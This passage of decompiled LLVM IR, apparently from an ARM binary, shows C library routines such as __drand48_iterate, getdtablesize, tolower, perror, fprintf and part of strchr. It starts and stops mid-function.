  uselistorder i32 %v0_1b4d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1b4bc, { 1, 0 }
  uselistorder i32 %v0_1b488, { 1, 0, 2 }
  uselistorder i32 %v0_1b47c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1b478, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 6, 5, 1, 2, 0, 7, 8, 9, 3, 4 }
  uselistorder i32 (i8*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @global_var_2abb8, { 0, 6, 2, 7, 1, 3, 4, 5 }
  uselistorder i32 35, { 3, 8, 9, 0, 6, 1, 7, 2, 4, 5 }
  uselistorder i32* @sb, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 3, 35, 36, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42, 0, 43, 17, 18, 19, 4 }
  uselistorder i32 ()* @__errno_location, { 65, 60, 59, 126, 64, 38, 36, 63, 23, 35, 27, 97, 124, 55, 128, 130, 129, 127, 32, 125, 31, 42, 2, 1, 0, 123, 96, 132, 79, 78, 72, 71, 122, 121, 120, 25, 26, 98, 19, 53, 28, 33, 73, 119, 56, 118, 117, 58, 69, 54, 39, 68, 43, 41, 30, 40, 4, 22, 21, 18, 83, 70, 17, 10, 5, 95, 67, 16, 85, 105, 104, 106, 84, 62, 116, 115, 57, 94, 114, 9, 15, 88, 113, 109, 24, 14, 3, 34, 93, 82, 37, 6, 81, 80, 112, 66, 29, 20, 8, 7, 111, 110, 108, 107, 13, 103, 102, 101, 92, 100, 99, 12, 11, 91, 90, 89, 52, 51, 50, 49, 48, 47, 46, 45, 44, 131, 87, 61, 86, 77, 76, 75, 74 }
  uselistorder i32 80, { 0, 7, 4, 5, 6, 1, 3, 2 }
  uselistorder i32 48, { 13, 4, 16, 8, 9, 10, 5, 2, 17, 18, 19, 3, 20, 6, 21, 15, 22, 1, 0, 14, 11, 23, 12, 7 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 7, 8, 5, 22, 1, 14, 0, 19, 20, 21, 3, 9, 6, 10, 2 }
  uselistorder i32 56, { 11, 16, 17, 2, 18, 3, 4, 13, 19, 14, 10, 6, 1, 15, 12, 0, 7, 8, 9, 20, 5 }
  uselistorder i32 44, { 14, 15, 16, 19, 20, 21, 9, 2, 3, 4, 5, 6, 7, 8, 1, 13, 22, 18, 0, 17, 10, 11, 12, 23 }
  uselistorder i32 -48, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 -32, { 2, 8, 3, 9, 10, 4, 5, 0, 6, 1, 7 }
  uselistorder i32 32, { 78, 79, 80, 0, 81, 82, 54, 105, 102, 90, 91, 33, 55, 56, 59, 37, 5, 4, 57, 7, 6, 58, 60, 61, 45, 46, 47, 48, 3, 8, 49, 50, 103, 34, 35, 31, 92, 38, 93, 104, 75, 76, 10, 9, 12, 11, 14, 13, 1, 32, 85, 83, 84, 94, 27, 95, 2, 39, 96, 97, 98, 99, 100, 28, 101, 62, 63, 86, 87, 88, 89, 73, 15, 16, 17, 36, 18, 40, 42, 19, 20, 64, 65, 77, 66, 67, 68, 69, 51, 72, 106, 107, 74, 70, 71, 52, 53, 43, 44, 22, 21, 24, 23, 29, 30, 26, 25, 41 }
  uselistorder i32* @fp, { 27, 30, 28, 1, 29, 31, 32, 33, 34, 0, 36, 35, 37, 38, 39, 69, 70, 71, 72, 73, 5, 56, 2, 40, 41, 42, 43, 44, 45, 46, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 6, 3, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 48, 49, 50, 51, 52, 53, 54, 55, 74 }
  uselistorder i32* @sl, { 28, 29, 30, 31, 34, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 7, 8, 9, 10, 11, 12, 13, 14, 19, 110, 111, 0, 112, 113, 114, 44, 48, 1, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 15, 2, 16, 17, 18, 20, 21, 100, 101, 102, 5, 6, 103, 104, 105, 106, 107, 108, 109, 22, 23, 87, 115, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 49, 50, 51, 88, 89, 90, 91, 92, 93, 94, 3, 95, 96, 97, 98, 99, 83, 84, 85, 86, 45, 46, 47, 27, 24, 26, 4, 25 }
  uselistorder i32* @r8, { 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 62, 63, 64, 65, 66, 67, 68, 74, 219, 220, 221, 222, 223, 224, 186, 187, 199, 200, 10, 120, 125, 126, 0, 127, 168, 169, 170, 171, 1, 172, 173, 174, 175, 201, 202, 203, 204, 205, 206, 207, 208, 209, 69, 70, 71, 72, 73, 75, 76, 77, 78, 210, 211, 212, 213, 51, 52, 53, 54, 55, 56, 57, 214, 215, 216, 217, 218, 79, 188, 189, 225, 231, 80, 81, 100, 101, 102, 103, 104, 226, 227, 228, 229, 230, 176, 177, 178, 179, 180, 181, 190, 191, 192, 193, 194, 128, 129, 130, 131, 132, 7, 133, 195, 196, 197, 198, 58, 59, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 2, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 182, 183, 184, 185, 121, 122, 123, 124, 97, 82, 83, 11, 84, 85, 86, 5, 6, 87, 8, 88, 89, 96, 12, 60, 61, 3, 90, 91, 92, 93, 94, 95, 98, 99, 105, 9, 106, 107, 13, 14, 15, 16, 17, 4, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder label %dec_label_pc_1b780, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1b77c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1b74c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1b748, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1b698, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b638.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1b678, { 1, 0 }
  uselistorder label %dec_label_pc_1b5f4, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1b4a8, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1b790 = load i32, i32* @r4, align 4
  store i32 %v3_1b790, i32* %stack_var_-36, align 4
  %v0_1b794 = load i32, i32* @r1, align 4
  %v1_1b794 = add i32 %v0_1b794, 15
  %v2_1b794 = inttoptr i32 %v1_1b794 to i8*
  %v3_1b794 = load i8, i8* %v2_1b794, align 1
  %v4_1b794 = zext i8 %v3_1b794 to i32
  store i32 %v4_1b794, i32* %r3.global-to-local, align 4
  %v1_1b798 = add i32 %v0_1b794, 14
  %v2_1b798 = inttoptr i32 %v1_1b798 to i8*
  %v3_1b798 = load i8, i8* %v2_1b798, align 1
  %v4_1b798 = zext i8 %v3_1b798 to i32
  %v4_1b7a0 = mul nuw nsw i32 %v4_1b794, 256
  %v5_1b7a0 = or i32 %v4_1b798, %v4_1b7a0
  store i32 %v5_1b7a0, i32* %r2.global-to-local, align 4
  %v7_1b7a0 = icmp eq i32 %v5_1b7a0, 0
  %v0_1b7a4 = load i32, i32* @r0, align 4
  %v1_1b7a4 = add i32 %v0_1b7a4, 4
  store i32 %v1_1b7a4, i32* %r3.global-to-local, align 4
  store i32 %v0_1b794, i32* %r5.global-to-local, align 4
  store i32 %v0_1b7a4, i32* %r8.global-to-local, align 4
  store i32 %v1_1b7a4, i32* %stack_var_-40, align 4
  %v1_1b7b4 = add i32 %v0_1b7a4, 2
  store i32 %v1_1b7b4, i32* %sb.global-to-local, align 4
  br i1 %v7_1b7a0, label %dec_label_pc_1b7bc, label %dec_label_pc_1b7e4

dec_label_pc_1b7bc:                               ; preds = %entry
  %v3_1b7c0 = add i32 %v0_1b794, 12
  %v4_1b7c0 = inttoptr i32 %v3_1b7c0 to i8*
  store i8 11, i8* %v4_1b7c0, align 1
  %v2_1b7c8 = load i32, i32* @r1, align 4
  %v3_1b7c8 = add i32 %v2_1b7c8, 14
  %v4_1b7c8 = inttoptr i32 %v3_1b7c8 to i8*
  store i8 1, i8* %v4_1b7c8, align 1
  store i32 -554899859, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r4.global-to-local, align 4
  %v1_1b7d4 = load i32, i32* @r1, align 4
  %v2_1b7d4 = add i32 %v1_1b7d4, 16
  %v3_1b7d4 = inttoptr i32 %v2_1b7d4 to i32*
  store i32 -554899859, i32* %v3_1b7d4, align 4
  %v0_1b7d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b7d8 = load i32, i32* @r1, align 4
  %v2_1b7d8 = add i32 %v1_1b7d8, 20
  %v3_1b7d8 = inttoptr i32 %v2_1b7d8 to i32*
  store i32 %v0_1b7d8, i32* %v3_1b7d8, align 4
  %v0_1b7dc = load i32, i32* %r2.global-to-local, align 4
  %v1_1b7dc = trunc i32 %v0_1b7dc to i8
  %v2_1b7dc = load i32, i32* @r1, align 4
  %v3_1b7dc = add i32 %v2_1b7dc, 15
  %v4_1b7dc = inttoptr i32 %v3_1b7dc to i8*
  store i8 %v1_1b7dc, i8* %v4_1b7dc, align 1
  %v0_1b7e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b7e0 = trunc i32 %v0_1b7e0 to i8
  %v2_1b7e0 = load i32, i32* @r1, align 4
  %v3_1b7e0 = add i32 %v2_1b7e0, 13
  %v4_1b7e0 = inttoptr i32 %v3_1b7e0 to i8*
  store i8 %v1_1b7e0, i8* %v4_1b7e0, align 1
  %v2_1b7e4.pre = load i32, i32* %stack_var_-40, align 4
  %v0_1b7e8.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_1b7f0.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1b824.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1b7e4

dec_label_pc_1b7e4:                               ; preds = %entry, %dec_label_pc_1b7bc
  %v0_1b830 = phi i32 [ %v0_1b794, %entry ], [ %v0_1b824.pre, %dec_label_pc_1b7bc ]
  %v2_1b84c = phi i32 [ %v0_1b7a4, %entry ], [ %v0_1b7f0.pre, %dec_label_pc_1b7bc ]
  %v0_1b7e8 = phi i32 [ %v1_1b7b4, %entry ], [ %v0_1b7e8.pre, %dec_label_pc_1b7bc ]
  %v2_1b7e4 = phi i32 [ %v1_1b7a4, %entry ], [ %v2_1b7e4.pre, %dec_label_pc_1b7bc ]
  store i32 %v2_1b7e4, i32* %r4.global-to-local, align 4
  %v1_1b7e8 = add i32 %v0_1b7e8, 1
  %v2_1b7e8 = inttoptr i32 %v1_1b7e8 to i8*
  %v3_1b7e8 = load i8, i8* %v2_1b7e8, align 1
  %v4_1b7e8 = zext i8 %v3_1b7e8 to i32
  store i32 %v4_1b7e8, i32* %ip.global-to-local, align 4
  %v1_1b7ec = add i32 %v2_1b7e4, 1
  %v2_1b7ec = inttoptr i32 %v1_1b7ec to i8*
  %v3_1b7ec = load i8, i8* %v2_1b7ec, align 1
  %v4_1b7ec = zext i8 %v3_1b7ec to i32
  store i32 %v4_1b7ec, i32* %lr.global-to-local, align 4
  %v1_1b7f0 = add i32 %v2_1b84c, 4
  %v2_1b7f0 = inttoptr i32 %v1_1b7f0 to i8*
  %v3_1b7f0 = load i8, i8* %v2_1b7f0, align 1
  %v4_1b7f0 = zext i8 %v3_1b7f0 to i32
  %v1_1b7f4 = inttoptr i32 %v2_1b84c to i8*
  %v2_1b7f4 = load i8, i8* %v1_1b7f4, align 1
  %v3_1b7f4 = zext i8 %v2_1b7f4 to i32
  %v1_1b7f8 = add i32 %v2_1b84c, 1
  %v2_1b7f8 = inttoptr i32 %v1_1b7f8 to i8*
  %v3_1b7f8 = load i8, i8* %v2_1b7f8, align 1
  %v4_1b7f8 = zext i8 %v3_1b7f8 to i32
  store i32 %v4_1b7f8, i32* %r3.global-to-local, align 4
  %v1_1b7fc = add i32 %v2_1b84c, 2
  %v2_1b7fc = inttoptr i32 %v1_1b7fc to i8*
  %v3_1b7fc = load i8, i8* %v2_1b7fc, align 1
  %v4_1b7fc = zext i8 %v3_1b7fc to i32
  %v4_1b800 = mul nuw nsw i32 %v4_1b7ec, 256
  %v5_1b800 = or i32 %v4_1b7f0, %v4_1b800
  store i32 %v5_1b800, i32* %r6.global-to-local, align 4
  %v4_1b804 = mul nuw nsw i32 %v4_1b7f8, 256
  %v5_1b804 = or i32 %v4_1b804, %v3_1b7f4
  %v4_1b808 = mul nuw nsw i32 %v4_1b7e8, 256
  %v5_1b808 = or i32 %v4_1b7fc, %v4_1b808
  store i32 %v5_1b804, i32* %r3.global-to-local, align 4
  %v3_1b818 = mul i32 %v5_1b808, 65536
  %v2_1b81c = or i32 %v3_1b818, %v5_1b804
  %v1_1b824 = add i32 %v0_1b830, 16
  store i32 %v1_1b824, i32* %r2.global-to-local, align 4
  %v1_1b828 = inttoptr i32 %v1_1b824 to i32*
  %v2_1b828 = load i32, i32* %v1_1b828, align 4
  store i32 %v2_1b828, i32* %r2.global-to-local, align 4
  %v3_1b828 = add i32 %v0_1b830, 20
  %v4_1b828 = inttoptr i32 %v3_1b828 to i32*
  %v5_1b828 = load i32, i32* %v4_1b828, align 4
  store i32 %v5_1b828, i32* %r3.global-to-local, align 4
  %v2_1b82c = mul i32 %v2_1b828, %v2_1b81c
  %v1_1b830 = add i32 %v0_1b830, 13
  %v2_1b830 = inttoptr i32 %v1_1b830 to i8*
  %v3_1b830 = load i8, i8* %v2_1b830, align 1
  %v4_1b830 = zext i8 %v3_1b830 to i32
  store i32 %v4_1b830, i32* %ip.global-to-local, align 4
  %v1_1b834 = add i32 %v0_1b830, 12
  %v2_1b834 = inttoptr i32 %v1_1b834 to i8*
  %v3_1b834 = load i8, i8* %v2_1b834, align 1
  %v4_1b834 = zext i8 %v3_1b834 to i32
  %v4_1b838 = mul nuw nsw i32 %v4_1b830, 256
  %v5_1b838 = or i32 %v4_1b834, %v4_1b838
  %v2_1b83c = add i32 %v5_1b838, %v2_1b82c
  store i32 %v2_1b83c, i32* %r5.global-to-local, align 4
  %v3_1b83c = icmp ult i32 %v2_1b83c, %v2_1b82c
  %v2_1b840 = zext i1 %v3_1b83c to i32
  %v3_1b840 = add nuw nsw i32 %v2_1b840, %v5_1b800
  store i32 %v3_1b840, i32* %r6.global-to-local, align 4
  %v3_1b844 = udiv i32 %v2_1b83c, 65536
  %v4_1b848 = mul i32 %v3_1b840, 65536
  %v5_1b848 = or i32 %v4_1b848, %v3_1b844
  store i32 %v5_1b848, i32* %r3.global-to-local, align 4
  %v1_1b84c = trunc i32 %v3_1b844 to i8
  store i8 %v1_1b84c, i8* %v2_1b7fc, align 1
  %v0_1b850 = load i32, i32* %r3.global-to-local, align 4
  %v3_1b850 = sdiv i32 %v0_1b850, 256
  store i32 %v3_1b850, i32* %ip.global-to-local, align 4
  %v0_1b854 = load i32, i32* %r5.global-to-local, align 4
  %v3_1b8545 = udiv i32 %v0_1b854, 256
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1b85c = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_1b85c, i32* %r3.global-to-local, align 4
  %v1_1b860 = trunc i32 %v3_1b8545 to i8
  %v2_1b860 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b860 = add i32 %v2_1b860, 1
  %v4_1b860 = inttoptr i32 %v3_1b860 to i8*
  store i8 %v1_1b860, i8* %v4_1b860, align 1
  %v0_1b864 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b864 = sdiv i32 %v0_1b864, 256
  store i32 %v3_1b864, i32* %lr.global-to-local, align 4
  %v0_1b86c = load i32, i32* %r2.global-to-local, align 4
  %v0_1b870 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b870 = trunc i32 %v0_1b870 to i8
  %v2_1b870 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b870 = inttoptr i32 %v2_1b870 to i8*
  store i8 %v1_1b870, i8* %v3_1b870, align 1
  %v0_1b874 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b874 = trunc i32 %v0_1b874 to i8
  %v2_1b874 = load i32, i32* %sb.global-to-local, align 4
  %v3_1b874 = add i32 %v2_1b874, 1
  %v4_1b874 = inttoptr i32 %v3_1b874 to i8*
  store i8 %v1_1b874, i8* %v4_1b874, align 1
  %v0_1b878 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b878 = trunc i32 %v0_1b878 to i8
  %v2_1b878 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b878 = add i32 %v2_1b878, 4
  %v4_1b878 = inttoptr i32 %v3_1b878 to i8*
  store i8 %v1_1b878, i8* %v4_1b878, align 1
  %v0_1b87c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b87c = trunc i32 %v0_1b87c to i8
  %v2_1b87c = load i32, i32* %r3.global-to-local, align 4
  %v3_1b87c = add i32 %v2_1b87c, 1
  %v4_1b87c = inttoptr i32 %v3_1b87c to i8*
  store i8 %v1_1b87c, i8* %v4_1b87c, align 1
  %v2_1b884 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1b884, i32* @r4, align 4
  ret i32 %v0_1b86c

; uselistorder directives
  uselistorder i32 %v2_1b82c, { 1, 0 }
  uselistorder i32 %v2_1b84c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1b830, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32 20, { 8, 71, 61, 62, 63, 4, 33, 5, 72, 1, 64, 0, 73, 9, 55, 74, 22, 23, 24, 25, 26, 27, 28, 29, 75, 34, 35, 36, 10, 37, 38, 39, 40, 30, 11, 41, 42, 43, 44, 45, 78, 6, 79, 2, 7, 65, 12, 76, 77, 46, 59, 47, 13, 3, 14, 67, 68, 69, 70, 48, 66, 56, 49, 50, 51, 52, 53, 54, 60, 80, 16, 17, 18, 19, 20, 21, 57, 31, 32, 58, 15 }
  uselistorder i8 1, { 9, 6, 2, 10, 4, 11, 12, 13, 14, 15, 16, 3, 0, 1, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 7, 40, 41, 42, 8, 43, 44, 5, 45, 46, 47, 48, 49 }
  uselistorder label %dec_label_pc_1b7e4, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1b890 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1b890, i32* @r1, align 4
  %v2_1b89c = call i32 @getrlimit(i32 7, i32 %v2_1b890)
  %v1_1b8a0 = icmp slt i32 %v2_1b89c, 0
  br i1 %v1_1b8a0, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_1b8a8 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_1b8b0 = phi i32 [ 256, %entry ], [ %v5_1b8a8, %bb ]
  ret i32 %v5_1b8b0

; uselistorder directives
  uselistorder i32 %v2_1b890, { 1, 0 }
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1b8bc = icmp slt i32 %arg1, 0
  br i1 %v1_1b8bc, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1b8bc = mul i32 %arg1, 2
  %v2_1b8c8 = load i32, i32* bitcast (i32** @global_var_2abc0.664 to i32*), align 4
  %v2_1b8cc = add i32 %v2_1b8c8, %v2_1b8bc
  %v3_1b8d0 = inttoptr i32 %v2_1b8cc to i8*
  %v4_1b8d0 = load i8, i8* %v3_1b8d0, align 1
  %v6_1b8d0 = zext i8 %v4_1b8d0 to i32
  %v1_1b8d4 = add i32 %v2_1b8cc, 1
  %v2_1b8d4 = inttoptr i32 %v1_1b8d4 to i8*
  %v3_1b8d4 = load i8, i8* %v2_1b8d4, align 1
  %v4_1b8d4 = zext i8 %v3_1b8d4 to i32
  %v3_1b8d8 = mul nuw i32 %v4_1b8d4, 16777216
  %v4_1b8dc = sdiv i32 %v3_1b8d8, 65536
  %v5_1b8dc = or i32 %v4_1b8dc, %v6_1b8d0
  ret i32 %v5_1b8dc

; uselistorder directives
  uselistorder i32 %v2_1b8cc, { 1, 0 }
}

define i32 @perror() local_unnamed_addr {
entry:
  %v0_1b8e8 = load i32, i32* @r0, align 4
  %v2_1b8e8 = icmp eq i32 %v0_1b8e8, 0
  br i1 %v2_1b8e8, label %dec_label_pc_1b904, label %dec_label_pc_1b8f4

dec_label_pc_1b8f4:                               ; preds = %entry
  %v1_1b8f4 = inttoptr i32 %v0_1b8e8 to i8*
  %v2_1b8f4 = load i8, i8* %v1_1b8f4, align 1
  %v2_1b8f8 = icmp eq i8 %v2_1b8f4, 0
  br i1 %v2_1b8f8, label %dec_label_pc_1b904, label %bb

bb:                                               ; preds = %dec_label_pc_1b8f4
  br label %dec_label_pc_1b908

dec_label_pc_1b904:                               ; preds = %dec_label_pc_1b8f4, %entry
  br label %dec_label_pc_1b908

dec_label_pc_1b908:                               ; preds = %bb, %dec_label_pc_1b904
  %v0_1b910 = phi i32 [ %v0_1b8e8, %bb ], [ ptrtoint (i32* @global_var_1df06.1048 to i32), %dec_label_pc_1b904 ]
  %v0_1b908 = phi i32 [ ptrtoint ([3 x i8]* @global_var_1df04.1050 to i32), %bb ], [ ptrtoint (i32* @global_var_1df06.1048 to i32), %dec_label_pc_1b904 ]
  %v2_1b914 = load i32, i32* @global_var_2a890, align 4
  store i32 %v2_1b914, i32* @r0, align 4
  %v5_1b91c = call i32 @fprintf(i32 %v2_1b914, i32 ptrtoint ([8 x i8]* @global_var_1df08.1053 to i32), i32 %v0_1b910, i32 %v0_1b908)
  ret i32 %v5_1b91c

; uselistorder directives
  uselistorder label %dec_label_pc_1b908, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_1b93c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1b93c, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1b94c = call i32 @__GI_vfprintf()
  ret i32 %v0_1b94c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_1b960 = load i32, i32* @r5, align 4
  %v9_1b960 = load i32, i32* @r6, align 4
  %v1_1b964 = urem i32 %arg1, 256
  br label %dec_label_pc_1b984

dec_label_pc_1b96c:                               ; preds = %dec_label_pc_1b984
  %v3_1b96c = load i8, i8* %.0, align 1
  %v4_1b96c = zext i8 %v3_1b96c to i32
  %v9_1b970 = icmp eq i32 %v4_1b96c, %v1_1b964
  br i1 %v9_1b970, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1b96c
  ret i32 %v1_1b984

bb24:                                             ; preds = %dec_label_pc_1b96c
  %v2_1b978 = icmp eq i8 %v3_1b96c, 0
  %v2_1b97c = add i32 %v1_1b984, 1
  %v3_1b97c = inttoptr i32 %v2_1b97c to i8*
  br i1 %v2_1b978, label %dec_label_pc_1ba58, label %dec_label_pc_1b984

dec_label_pc_1b984:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1b97c, %bb24 ]
  %v1_1b984 = ptrtoint i8* %.0 to i32
  %v2_1b984 = urem i32 %v1_1b984, 4
  %v3_1b984 = icmp eq i32 %v2_1b984, 0
  br i1 %v3_1b984, label %dec_label_pc_1b98c, label %dec_label_pc_1b96c

dec_label_pc_1b98c:                               ; preds = %dec_label_pc_1b984
  %v4_1b98c = mul nuw nsw i32 %v1_1b964, 256
  %v5_1b98c = or i32 %v4_1b98c, %v1_1b964
  %v4_1b994 = mul i32 %v5_1b98c, 65536
  %v5_1b994 = or i32 %v4_1b994, %v5_1b98c
  br label %dec_label_pc_1b998

dec_label_pc_1b998:                               ; preds = %dec_label_pc_1ba50, %dec_label_pc_1b9d8, %dec_label_pc_1b98c
  %v0_1b9fc = phi i32 [ %v1_1b984, %dec_label_pc_1b98c ], [ %v4_1b998, %dec_label_pc_1b9d8 ], [ %v4_1b998, %dec_label_pc_1ba50 ]
  %v1_1b998 = inttoptr i32 %v0_1b9fc to i32*
  %v2_1b998 = load i32, i32* %v1_1b998, align 4
  %v4_1b998 = add i32 %v0_1b9fc, 4
  %v2_1b9a0 = xor i32 %v2_1b998, %v5_1b994
  %v2_1b9ac = add i32 %v2_1b998, 2130640639
  %v1_1b9b0 = sub i32 -1, %v2_1b998
  %v2_1b9b4 = xor i32 %v2_1b9ac, %v1_1b9b0
  %v2_1b9b8 = add i32 %v2_1b9a0, 2130640639
  %v1_1b9c0 = sub i32 -1, %v2_1b9a0
  %v2_1b9c4 = and i32 %v2_1b9b4, -2130640640
  %v2_1b9c8 = xor i32 %v2_1b9b8, %v1_1b9c0
  %v2_1b9cc = icmp eq i32 %v2_1b9c4, 0
  %v2_1b9d0 = and i32 %v2_1b9c8, -2130640640
  store i32 %v2_1b9d0, i32* @lr, align 4
  br i1 %v2_1b9cc, label %dec_label_pc_1b9d8, label %dec_label_pc_1b9e0

dec_label_pc_1b9d8:                               ; preds = %dec_label_pc_1b998
  %v2_1b9d8 = icmp eq i32 %v2_1b9d0, 0
  br i1 %v2_1b9d8, label %dec_label_pc_1b998, label %dec_label_pc_1b9e0

dec_label_pc_1b9e0:                               ; preds = %dec_label_pc_1b998, %dec_label_pc_1b9d8
  %v2_1b9e0 = inttoptr i32 %v0_1b9fc to i8*
  %v3_1b9e0 = load i8, i8* %v2_1b9e0, align 1
  %v4_1b9e0 = zext i8 %v3_1b9e0 to i32
  %v1_1b9e8 = add i32 %v0_1b9fc, 1
  %v1_1b9ec = add i32 %v0_1b9fc, 2
  %v9_1b9f0 = icmp eq i32 %v4_1b9e0, %v1_1b964
  %v1_1b9f4 = add i32 %v0_1b9fc, 3
  br i1 %v9_1b9f0, label %dec_label_pc_1b9fc, label %dec_label_pc_1ba04

dec_label_pc_1b9fc:                               ; preds = %dec_label_pc_1b9e0
  store i32 %v6_1b960, i32* @r5, align 4
  store i32 %v9_1b960, i32* @r6, align 4
  ret i32 %v0_1b9fc

dec_label_pc_1ba04:                               ; preds = %dec_label_pc_1b9e0
  %v2_1ba04 = icmp eq i8 %v3_1b9e0, 0
  br i1 %v2_1ba04, label %dec_label_pc_1ba58, label %dec_label_pc_1ba0c

dec_label_pc_1ba0c:                               ; preds = %dec_label_pc_1ba04
  %v2_1ba0c = inttoptr i32 %v1_1b9e8 to i8*
  %v3_1ba0c = load i8, i8* %v2_1ba0c, align 1
  %v4_1ba0c = zext i8 %v3_1ba0c to i32
  %v9_1ba10 = icmp eq i32 %v4_1ba0c, %v1_1b964
  br i1 %v9_1ba10, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1ba0c
  store i32 %v6_1b960, i32* @r5, align 4
  store i32 %v9_1b960, i32* @r6, align 4
  ret i32 %v1_1b9e8

bb26:                                             ; preds = %dec_label_pc_1ba0c
